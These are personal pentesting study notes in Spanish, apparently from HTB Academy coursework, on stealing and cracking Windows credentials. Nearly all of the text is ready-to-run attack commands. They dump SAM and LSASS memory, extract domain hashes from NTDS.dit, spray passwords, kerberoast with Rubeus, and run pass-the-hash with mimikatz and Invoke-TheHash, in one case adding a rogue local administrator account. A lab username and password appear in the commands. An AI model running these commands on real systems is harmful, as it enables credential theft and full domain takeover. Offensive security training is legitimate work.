###SAM, SYSTEM Y SECURITY
##	Definiciones	##
Teniendo acceso administrador se puede obtener:
	SAM: Base de datos con hasshe de las cuentas locales
	system: Clave de arranque del sistema utilizada para cifrar SAM
	security: Credenciales en cache para cuenta de dominio.
	
	## reg.exe
	reg.exe save hklm\file_hashes dir_to_save
	#De esta forma como administrador podemos guardar una copia de los archivos sam, system o security
	
	# Obtencion remota	#
	crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
	#Obtener lsa con credenciales admin validas
	crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
	#Obtener sam con credenciales admin validas
	
	python3 impacket/examples/secretsdump.py -sam SAM.bin -system SYSTEM.bin LOCAL > hashes
	#Si tenemos los archivos obtenemos los hashes de esta forma para con hashcat -m 1000 podamos crackearlos

##Crackear varios protocolos
crackmapexec protocolo target_ip -u user.list -p password.list
#Usar lista de usuarios y lista de contraseñas para intentar loguearse en el protocolo que crackmapexec admite
crackmapexec smb target_ip -u user.list -p password.listo --carpetacompartida
#Con smb cambia un poco

hydra -L user.list -P password.list protocolo://10.129.42.197
#Lo mismo que crackmapexec pero con hydra

###LSASS
##	Definiciones	##
LSASS: Servicio para gestion de credenciales y protocolos de autenticacon en windows.
	- Tokens de acceso.
	- Regula politicas de seguridad.
	- Escribe el registro de seguridad de windows.
	- Cachea las credenciales locales en memoria
	Posee credenciales de usuarios con secion iniciada en el momento

	# METODOS PARA VOLCAR LA MEMORIA DEL PROCESO
	# Administrador de tareas	#
		Task Manager> Select the Processes tab> Find & right click the Local Security Authority Process> Select Create dump file
		#Esto crea un archivo lsass.DMP en C:\Users\loggedonusersdirectory\AppData\Local\Temp. Archivo que transferimos a nuestra maquina.
	
	# Rundll32.exe y Comsvcs.dll	#
		Los antivirus reconocen esto como actividad maliciosa!!
	
		tasklist /svc
		#En CMD podemos buscar el id de proceso al cual corresponde lsass.exe
		Get-Process lsass
		#En powershell podemos buscar el proceso de esta forma
	
		rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
		#En powershell con sesion elevada podemos crear el archivo dump de esta forma
		#Usamos rundll332 para usar la funcion exportadora comsvcs.dll que llama a mindump para volcar la memoria del procewso en el dir del final
	
	# EXTRAER CREDENCIALES DEL .DMP	#	
	#	Definiciones	#
	MSV: Paquete de autenticaacion den windows para llamar a LSA y validar los intentos de inicio de sesion en SAM.
	WIDIGESTION: Protocolo de autenticacion mas antiguo que se encuentra de forma predeterminada en Windows XP, WIndows 8, Windows sever 2003 y 2012. Las credenciales utilizadas
		por este proceso son almacenadas en cache en clear txt por lsass.
	Kerberos: Protocolo de autenticacion de red utilizado por AD. Luego de que un usuario se autentique en AD este recibe un "ticket" usado para acceder a carpetas compartidas.
		Existe la posibilidad de extraer pins, tickets, password en cache, etc gracias a LSASS.
	DPAPI: APIs usadas en windows para encriptar y desencriptar datos DPAPI (Data protetion Application programming).
		Algunos de los datos:
			- Contraseñas de auto completar en navegadores
			- Contraseñas de email
			- Contraseñas almacenadas para remote connection
			- Credenciales para acceder a recursos compartidos como redes, vpns, etc.
	# Pypykatz #
		pypykatz lsa minidump lsass.dmp
		#Los hash resultantes son NT. Con hashcat y el parametro -m 1000 podemos intentar decifrarlo
		hashcat -m 1000 <hash> dictionary
###NTDS.dit
#	Definiciones	#
Un sistema unido a dominio (AD en este caso) no utiliza SAM, sino un controlador de dominio el cual valida las credenciales antes de permitir acceso a un usuario.
Se puede seguir usando SAM en caso de que se requiera ingresar a una cuenta local.

Los ataques de contraseña mediante diccionarios pueden no ser tan efectivos gracias a las politicas de grupo. Aun asi se puede intentar obtener ciertos parametros
para cotar los intentos. BUscar mails, posibles usuarios, etc. "google: empresa.com filetype:pdf" de esta forma se suelen obtener mails.
Aun asi, no hay politicas default entonro a contraseñas, de esta forma puede existir dicha vulnerabilidad.
	#	Comandos	#
	./username-anarchy -i input_names.txt
	#Username-anarchy permite crear listas de posibles usuarios con un txt que le pasamos.
		
	#NTLM, TGS y kerberoasting
	Rubeus.exe /creduser:<comp_user> /credpassword:<comp_password> /user:<user>
	#Si tenemos un usuario podemos intentar usar las credenciales para obtener el hash TGS  del <user>
	python3 ./secretsdump.py -just-dc-ntlm -just-dc-user <domain>/<target_user> <domain>/<ad_user>@<ip>
	#Una vez obtenido la password gracias a crackear el TGS de un usuario de dominio administrador, podemos intentar obtener el hash NTLM del user especificado
	python3 ./secretsdump.py -just-dc-ntlm  <domain>/<ad_user>@<ip>
	#Tambien podemos no especificar un usuario para que nos de el NTLM de todos los usuarios


Una vez descubiertas credenciales...
NTDS.dit: Es un servicio de AD para buscar y organizar servicios de red. Almacena todos los nombres de usuario de dominio, hash de contraseñas, etc.
	Se encuentra almacenado en %systemroot%/ntds
	
	#	Comandos	#
	net localgroup
	#Nos permite saber a que grupo pertenece el usuario al cual nos conectamos y tenemos shell para saber que puede hacer
	net user <user>
	#Nos permite saber los privilegios de la cuenta
	
	vssadmin CREATE SHADOW /For=C:
	#Corriendo esto en la shell que obtuvimos mediante evil-winrm podemos hacer una isntancia de la unidad
	cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
	#Copiamos NTDS.dit a nuestro host

	crackmapexec smb <ip> -u <user> -p <password> --ntds
	#Obtenemos NTDS mediante crackmapexec

#	Aclaraciones	#
Si obtenemos un hash podemos intentar utilizarlo como contraseña. Un ataque llamado Pass the hash se aprovecha del protocolo NTLM para autenticar a un usuario mediante hash en vez de su contraseña.
Para abusar de esto se puede intentar usar usr:password_hash

###BUSCAR PASSWORD EN WINDOWS
start lazagne.exe all
#Usamos el tool lazagne.exe para buscar contraseñas

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
#Buscamos archiivos de ese tipo con la palabra password

####BITLOCKER
Bitlocker es un programa de cifrado en windows que permite recuperar la contraseña de una unidad en caso de perdida. Esta commpuesto por 48 digitos generados durante la configuracion de bitlocker.
Esto puede ser roto por john

bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
#Se obtiene el hash para romperlo con hashcat o john
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
#Rompiendo el hash con hashcat

###PASS THE HASH
##	Definiciones	##
PTH es una tecnica en donde un atacante no necesita la contrase;a para loguearse sino simplemente el hash de la misma.

	## PTH with mimikatz
	mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<dominio> /run:cmd.exe" exit
	#Obtenemos cmd con el usuario especificado
	
	## PTH with PowerShell Invoke-TheHash
	Tool para perform PTH attack con WMI y SMB. Se puede descargar por: https://github.com/Kevin-Robertson/Invoke-TheHash
	
	Import-Module .\Invoke-TheHash.psd1
	Invoke-SMBExec -Target <target ip> -Domain <domain> -Username <user> -Hash <hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
	#Con ambos comandos ya podemos ejecutar lo que queremos. Para reverse shell una buena pagina es: https://www.revshells.com/
	
